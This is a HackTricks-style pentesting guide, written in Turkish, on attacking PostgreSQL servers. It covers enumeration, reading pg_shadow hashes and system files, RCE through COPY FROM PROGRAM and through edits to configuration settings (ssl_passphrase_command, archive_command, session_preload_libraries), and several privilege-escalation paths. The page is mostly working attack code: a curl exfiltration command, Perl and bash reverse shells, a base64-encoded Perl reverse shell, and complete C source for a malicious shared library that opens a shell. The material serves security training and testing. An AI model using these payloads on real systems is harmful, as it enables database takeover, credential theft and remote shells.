# 5432,5433 - Pentesting Postgresql


{{#include ../banners/hacktricks-training.md}}

## **Temel Bilgiler**

**PostgreSQL**, **açık kaynak** olan bir **nesne-ilişkisel veritabanı sistemi** olarak tanımlanmaktadır. Bu sistem yalnızca SQL dilini kullanmakla kalmaz, aynı zamanda ek özelliklerle onu geliştirir. Yetenekleri, geniş bir veri türü ve işlem yelpazesini yönetmesine olanak tanır, bu da onu geliştiriciler ve organizasyonlar için çok yönlü bir seçim haline getirir.

**Varsayılan port:** 5432, ve bu port zaten kullanılıyorsa, postgresql'in kullanılmayan bir sonraki portu (muhtemelen 5433) kullanacağı görünmektedir.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Bağlanma ve Temel Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Eğer **`\list`** komutunu çalıştırdığınızda **`rdsadmin`** adında bir veritabanı bulursanız, bir **AWS postgresql veritabanası** içinde olduğunuzu bilirsiniz.

**PostgreSQL veritabanını nasıl kötüye kullanacağınız** hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Otomatik Sayım
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Port taraması**

[**Bu araştırmaya**](https://www.exploit-db.com/papers/13084) göre, bir bağlantı denemesi başarısız olduğunda, `dblink` bir `sqlclient_unable_to_establish_sqlconnection` istisnası fırlatır ve hata hakkında bir açıklama içerir. Bu detayların örnekleri aşağıda listelenmiştir.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Sunucu kapalı

`DETAY: sunucuya bağlanılamadı: Host'a giden yol yok. Sunucu "1.2.3.4" adresinde çalışıyor mu ve 5678 numaralı portta TCP/IP bağlantılarını kabul ediyor mu?`

- Port kapalı
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port açık
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
ve
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port açık veya filtrelenmiş
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
PL/pgSQL fonksiyonlarında, şu anda istisna ayrıntılarını elde etmek mümkün değildir. Ancak, PostgreSQL sunucusuna doğrudan erişiminiz varsa, gerekli bilgileri alabilirsiniz. Sistem tablolarından kullanıcı adları ve şifreleri çıkarmak mümkün değilse, önceki bölümde tartışılan kelime listesi saldırı yöntemini kullanmayı düşünebilirsiniz, çünkü bu olumlu sonuçlar verebilir.

## Ayrıcalıkların Sayımı

### Roller

| Rol Türleri    |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Rol süper kullanıcı ayrıcalıklarına sahiptir                                                                                                        |
| rolinherit     | Rol, üyesi olduğu rollerin ayrıcalıklarını otomatik olarak devralır                                                                                 |
| rolcreaterole  | Rol daha fazla rol oluşturabilir                                                                                                                    |
| rolcreatedb    | Rol veritabanları oluşturabilir                                                                                                                     |
| rolcanlogin    | Rol giriş yapabilir. Yani, bu rol başlangıç oturum yetkilendirme tanımlayıcısı olarak verilebilir                                                  |
| rolreplication | Rol bir çoğaltma rolüdür. Bir çoğaltma rolü, çoğaltma bağlantılarını başlatabilir ve çoğaltma slotlarını oluşturup kaldırabilir.                   |
| rolconnlimit   | Giriş yapabilen roller için, bu rolün yapabileceği maksimum eşzamanlı bağlantı sayısını ayarlar. -1 sınırsız anlamına gelir.                        |
| rolpassword    | Şifre değil (her zaman `********` olarak okunur)                                                                                                     |
| rolvaliduntil  | Şifre son kullanma zamanı (sadece şifre kimlik doğrulaması için kullanılır); son kullanma yoksa null                                               |
| rolbypassrls   | Rol, her satır düzeyinde güvenlik politikasını atlar, daha fazla bilgi için [Bölüm 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) bakın. |
| rolconfig      | Çalışma zamanı yapılandırma değişkenleri için rol özel varsayılanları                                                                                 |
| oid            | Rolün kimliği                                                                                                                                       |

#### İlginç Gruplar

- Eğer **`pg_execute_server_program`** üyesiyseniz, programları **çalıştırabilirsiniz**
- Eğer **`pg_read_server_files`** üyesiyseniz, dosyaları **okuyabilirsiniz**
- Eğer **`pg_write_server_files`** üyesiyseniz, dosyaları **yazabilirsiniz**

> [!NOTE]
> Postgres'te bir **kullanıcı**, bir **grup** ve bir **rol** **aynıdır**. Bu sadece **nasıl kullandığınıza** ve **giriş yapmasına izin verip vermediğinize** bağlıdır.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tablolar
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Fonksiyonlar
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Dosya sistemi eylemleri

### Dizinleri ve dosyaları oku

Bu [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) ile tanımlanan **`DEFAULT_ROLE_READ_SERVER_FILES`** grubunun (adı **`pg_read_server_files`**) ve **süper kullanıcıların** herhangi bir yolda **`COPY`** yöntemini kullanabilirler (bakınız `convert_and_check_filename` `genfile.c` içinde):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Unutmayın ki, eğer süper kullanıcı değilseniz ama **CREATEROLE** izinleriniz varsa, **kendinizi o grubun üyesi yapabilirsiniz:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

**Dosya okumak veya bir dizini listelemek için** kullanılabilecek **diğer postgres fonksiyonları** vardır. Sadece **süper kullanıcılar** ve **açık izinlere sahip kullanıcılar** bunları kullanabilir:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Daha fazla **fonksiyon** bulabilirsiniz [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Basit Dosya Yazma

Sadece **süper kullanıcılar** ve **`pg_write_server_files`** üyeleri dosya yazmak için kopya kullanabilir.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Unutmayın ki, süper kullanıcı değilseniz ancak **`CREATEROLE`** izinleriniz varsa, **kendinizi o grubun üyesi yapabilirsiniz:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

COPY'nin yeni satır karakterlerini işleyemediğini unutmayın, bu nedenle bir base64 yükü kullanıyor olsanız bile **tek satırlık bir komut göndermeniz gerekir.**\
Bu tekniğin çok önemli bir sınırlaması, **`copy`'nin bazı ikili değerleri değiştirdiği için ikili dosyaları yazmak için kullanılamamasıdır.**

### **İkili dosya yükleme**

Ancak, **büyük ikili dosyaları yüklemek için başka teknikler vardır:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}



### Yerel dosya yazma yoluyla PostgreSQL tablo verilerini güncelleme

PostgreSQL sunucu dosyalarını okuma ve yazma yetkiniz varsa, **ilişkili dosya düğümünü** [PostgreSQL veri dizininde](https://www.postgresql.org/docs/8.1/storage.html) güncelleyebilirsiniz. **Bu teknik hakkında daha fazla bilgi** [**burada**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Gerekli adımlar:

1.  PostgreSQL veri dizinini elde edin

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Not:** Eğer ayarlardan mevcut veri dizini yolunu alamıyorsanız, `SELECT version()` sorgusu ile PostgreSQL'in ana sürümünü sorgulayabilir ve yolu brute-force ile denemeye çalışabilirsiniz. PostgreSQL'in Unix kurulumlarındaki yaygın veri dizini yolları `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/` şeklindedir. Yaygın bir küme adı `main`dir.

2.  Hedef tablo ile ilişkili dosya düğümüne göre bir göreli yol elde edin

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Bu sorgu `base/3/1337` gibi bir şey döndürmelidir. Diskteki tam yol `$DATA_DIRECTORY/base/3/1337`, yani `/var/lib/postgresql/13/main/base/3/1337` olacaktır.

3.  `lo_*` fonksiyonları aracılığıyla dosya düğümünü indirin

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Hedef tablo ile ilişkili veri türünü alın

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) kullanarak [dosya düğümünü düzenleyin](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); tüm `rol*` boolean bayraklarını tam izinler için 1 olarak ayarlayın.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Düzenlenmiş dosya düğümünü `lo_*` fonksiyonları aracılığıyla yeniden yükleyin ve diskteki orijinal dosyayı üzerine yazın

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(İsteğe bağlı)_ Pahalı bir SQL sorgusu çalıştırarak bellek içi tablo önbelleğini temizleyin

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Artık PostgreSQL'de güncellenmiş tablo değerlerini görmelisiniz.

Ayrıca `pg_authid` tablosunu düzenleyerek süperadmin olabilirsiniz. **Bakınız** [**aşağıdaki bölüm**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **Program için RCE**

[9.3 sürümünden](https://www.postgresql.org/docs/9.3/release-9-3.html) itibaren, yalnızca **süper kullanıcılar** ve **`pg_execute_server_program`** grubunun üyeleri RCE için copy kullanabilir (sızdırma örneği:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Örnek exec:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Unutmayın ki, süper kullanıcı değilseniz ancak **`CREATEROLE`** izinleriniz varsa, **kendinizi o grubun üyesi yapabilirsiniz:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Daha fazla bilgi.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ya da **metasploit**'ten `multi/postgres/postgres_copy_from_program_cmd_exec` modülünü kullanabilirsiniz.\
Bu güvenlik açığı hakkında daha fazla bilgi [**burada**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). CVE-2019-9193 olarak rapor edilmesine rağmen, Postges bunun bir [özellik olduğunu ve düzeltmeyeceğini](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/) açıkladı.

### PostgreSQL Dilleri ile RCE

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### PostgreSQL uzantıları ile RCE

Önceki yazıdan **ikili dosyaları yüklemeyi** öğrendikten sonra, **bir postgresql uzantısı yükleyerek ve yükleyerek RCE elde etmeyi** deneyebilirsiniz.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### PostgreSQL yapılandırma dosyası RCE

> [!NOTE]
> Aşağıdaki RCE vektörleri, tüm adımların iç içe geçmiş SELECT ifadeleri aracılığıyla gerçekleştirilebileceği kısıtlı SQLi bağlamlarında özellikle yararlıdır.

PostgreSQL'in **yapılandırma dosyası**, veritabanını çalıştıran **postgres kullanıcısı** tarafından **yazılabilir**, bu nedenle **süper kullanıcı** olarak, dosya sisteminde dosyalar yazabilir ve dolayısıyla bu dosyayı **üzerine yazabilirsiniz.**

![](<../images/image (322).png>)

#### **ssl_passphrase_command ile RCE**

Bu teknik hakkında daha fazla bilgi [burada](https://pulsesecurity.co.nz/articles/postgres-sqli).

Yapılandırma dosyasında RCE'ye yol açabilecek bazı ilginç özellikler vardır:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Veritabanının özel anahtarının yolu
- `ssl_passphrase_command = ''` Özel dosya şifreyle korunuyorsa (şifreli) postgresql **bu özellikte belirtilen komutu çalıştıracaktır**.
- `ssl_passphrase_command_supports_reload = off` **Eğer** bu özellik **açık** ise, şifreyle korunan anahtar için **çalıştırılan komut**, `pg_reload_conf()` **çalıştırıldığında** **çalıştırılacaktır**.

Sonra, bir saldırganın yapması gerekenler:

1. Sunucudan **özel anahtarı dökme**
2. İndirilen özel anahtarı **şifreleme**:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Üzerine yazma**
4. Mevcut postgresql **yapılandırmasını dökme**
5. **Yapılandırmayı** belirtilen özellikler ile üzerine yazma:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. `pg_reload_conf()`'ü çalıştırma

Bunu test ederken, bunun yalnızca **özel anahtar dosyasının 640 ayrıcalığı varsa**, **root** tarafından sahiplenilmişse ve **ssl-cert veya postgres grubuna** aitse (yani postgres kullanıcısının okuyabilmesi için) ve _/var/lib/postgresql/12/main_ dizininde yer alıyorsa çalışacağını fark ettim.

#### **archive_command ile RCE**

**Daha fazla** [**bilgi için bu yapılandırma ve WAL hakkında buraya**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Yapılandırma dosyasında istismar edilebilecek bir diğer özellik `archive_command`'dır.

Bunun çalışması için, `archive_mode` ayarının `'on'` veya `'always'` olması gerekir. Eğer bu doğruysa, o zaman `archive_command` içindeki komutu üzerine yazabilir ve WAL (write-ahead logging) işlemleri aracılığıyla çalıştırılmasını zorlayabiliriz.

Genel adımlar şunlardır:

1. Arşiv modunun etkin olup olmadığını kontrol etme: `SELECT current_setting('archive_mode')`
2. `archive_command`'ı yükle ile üzerine yazma. Örneğin, bir ters kabuk: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Yapılandırmayı yeniden yükle: `SELECT pg_reload_conf()`
4. Arşiv komutunu çağıracak WAL işleminin çalışmasını zorla: `SELECT pg_switch_wal()` veya bazı Postgres sürümleri için `SELECT pg_switch_xlog()`

#### **preload kütüphaneleri ile RCE**

Bu teknik hakkında daha fazla bilgi [burada](https://adeadfed.com/posts/postgresql-select-only-rce/).

Bu saldırı vektörü aşağıdaki yapılandırma değişkenlerinden yararlanmaktadır:

- `session_preload_libraries` -- istemci bağlantısında PostgreSQL sunucusu tarafından yüklenecek kütüphaneler.
- `dynamic_library_path` -- PostgreSQL sunucusunun kütüphaneleri arayacağı dizinlerin listesi.

`dynamic_library_path` değerini, veritabanını çalıştıran `postgres` kullanıcısı tarafından yazılabilir bir dizine, örneğin `/tmp/` dizinine ayarlayabiliriz ve oraya kötü niyetli bir `.so` nesnesi yükleyebiliriz. Sonra, PostgreSQL sunucusunu, `session_preload_libraries` değişkenine dahil ederek yeni yüklediğimiz kütüphaneyi yüklemeye zorlayacağız.

Saldırı adımları şunlardır:

1. Orijinal `postgresql.conf` dosyasını indirin
2. `/tmp/` dizinini `dynamic_library_path` değerine dahil edin, örneğin `dynamic_library_path = '/tmp:$libdir'`
3. Kötü niyetli kütüphane adını `session_preload_libraries` değerine dahil edin, örneğin `session_preload_libraries = 'payload.so'`
4. `SELECT version()` sorgusu ile ana PostgreSQL sürümünü kontrol edin
5. Kötü niyetli kütüphane kodunu doğru PostgreSQL geliştirme paketi ile derleyin Örnek kod:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
code taken from https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kodu derleme:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Adım 2-3'te oluşturulan kötü niyetli `postgresql.conf` dosyasını yükleyin ve orijinal dosyanın üzerine yazın
7. Adım 5'teki `payload.so` dosyasını `/tmp` dizinine yükleyin
8. Sunucu yapılandırmasını sunucuyu yeniden başlatarak veya `SELECT pg_reload_conf()` sorgusunu çağırarak yeniden yükleyin
9. Bir sonraki DB bağlantısında, ters kabuk bağlantısını alacaksınız.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

[**Belgeler**](https://www.postgresql.org/docs/13/sql-grant.html)'e göre: _**`CREATEROLE`** ayrıcalığına sahip roller, **süper kullanıcı** olmayan herhangi bir rolün üyeliğini **verebilir veya geri alabilir**._

Yani, eğer **`CREATEROLE`** izniniz varsa, diğer **roller** (süper kullanıcı olmayan) için kendinize erişim verebilir ve dosyaları okuma & yazma ve komutları çalıştırma seçeneği elde edebilirsiniz:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Şifreyi Değiştir

Bu role sahip kullanıcılar ayrıca diğer **süper kullanıcı olmayan** kullanıcıların **şifrelerini** **değiştirebilir**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

**Yerel kullanıcıların PostgreSQL'e herhangi bir şifre vermeden giriş yapabildiğini** bulmak oldukça yaygındır. Bu nedenle, **kod çalıştırma izinlerini topladıktan sonra** bu izinleri kötüye kullanarak **`SUPERUSER`** rolünü elde edebilirsiniz:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Bu genellikle **`pg_hba.conf`** dosyasındaki aşağıdaki satırlar nedeniyle mümkündür:
>
> ```bash
> # "local" yalnızca Unix domain socket bağlantıları içindir
> local   all             all                                     trust
> # IPv4 yerel bağlantılar:
> host    all             all             127.0.0.1/32            trust
> # IPv6 yerel bağlantılar:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

[**Bu yazıda**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) kullanıcılara verilen ALTER TABLE ayrıcalığını kötüye kullanarak Postgres GCP'de **privesc**'in nasıl mümkün olduğu açıklanmaktadır.

**Başka bir kullanıcıyı bir tablonun sahibi yapmak** istediğinizde, bunu engelleyen bir **hata** almanız gerekir, ancak görünüşe göre GCP bu **seçeneği süper kullanıcı olmayan postgres kullanıcısına** vermiştir:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Bu fikri, **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) komutları bir **indeks fonksiyonu** olan bir **tabloda** çalıştırıldığında, **fonksiyonun** **tablo** **sahibinin izinleriyle** komutun bir parçası olarak **çağrıldığını** göz önünde bulundurarak birleştirirsek, bir fonksiyonla bir indeks oluşturmak ve o tablo üzerinde bir **süper kullanıcıya** sahiplik izinleri vermek mümkündür. Ardından, sahibinin ayrıcalıklarını kullanarak komutları çalıştırabilecek kötü niyetli fonksiyonla tablo üzerinde ANALYZE çalıştırılabilir.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Exploitation

1. Yeni bir tablo oluşturarak başlayın.
2. İndeks fonksiyonu için veri sağlamak amacıyla tabloya bazı alakasız içerikler ekleyin.
3. Yetkisiz komutların çalıştırılmasına izin veren bir kod yürütme yükü içeren kötü niyetli bir indeks fonksiyonu geliştirin.
4. Tablo sahibini "cloudsqladmin" olarak DEĞİŞTİRİN; bu, Cloud SQL'in veritabanını yönetmek ve bakımını yapmak için kullandığı GCP'nin süper kullanıcı rolüdür.
5. Tablo üzerinde bir ANALİZ işlemi gerçekleştirin. Bu işlem, PostgreSQL motorunun tablo sahibinin kullanıcı bağlamına, yani "cloudsqladmin" olarak geçmesini zorlar. Sonuç olarak, kötü niyetli indeks fonksiyonu "cloudsqladmin" izinleriyle çağrılır ve böylece daha önce yetkisiz olan shell komutunun çalıştırılmasına olanak tanır.

PostgreSQL'de bu akış şöyle görünür:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Sonra, `shell_commands_results` tablosu yürütülen kodun çıktısını içerecektir:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Yerel Giriş

Bazı yanlış yapılandırılmış postgresql örnekleri, herhangi bir yerel kullanıcının girişine izin verebilir, **`dblink` fonksiyonu** kullanarak 127.0.0.1'den yerel olarak giriş yapmak mümkündür:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Önceki sorgunun çalışması için **`dblink` fonksiyonunun mevcut olması gerektiğini** unutmayın. Eğer mevcut değilse, bunu oluşturmayı deneyebilirsiniz:
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Eğer daha fazla ayrıcalığa sahip bir kullanıcının şifresine sahipseniz, ancak bu kullanıcının dış bir IP'den giriş yapmasına izin verilmiyorsa, o kullanıcı olarak sorguları çalıştırmak için aşağıdaki fonksiyonu kullanabilirsiniz:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Bu fonksiyonun mevcut olup olmadığını kontrol etmek mümkündür:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Özel tanımlı fonksiyon ile** SECURITY DEFINER

[**Bu yazıda**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesterlar IBM tarafından sağlanan bir postgres örneği içinde privesc yapmayı başardılar, çünkü **SECURITY DEFINER bayrağına sahip bu fonksiyonu buldular**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

[**Belgelerde açıklandığı gibi**](https://www.postgresql.org/docs/current/sql-createfunction.html) **SECURITY DEFINER olan bir fonksiyon** **onu sahip olan kullanıcının** ayrıcalıklarıyla çalıştırılır. Bu nedenle, eğer fonksiyon **SQL Injection'a karşı savunmasızsa** veya **saldırgan tarafından kontrol edilen parametrelerle bazı ayrıcalıklı işlemler yapıyorsa**, bu durum **postgres içinde ayrıcalıkları artırmak için** kötüye kullanılabilir.

Önceki kodun 4. satırında fonksiyonun **SECURITY DEFINER** bayrağına sahip olduğunu görebilirsiniz.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
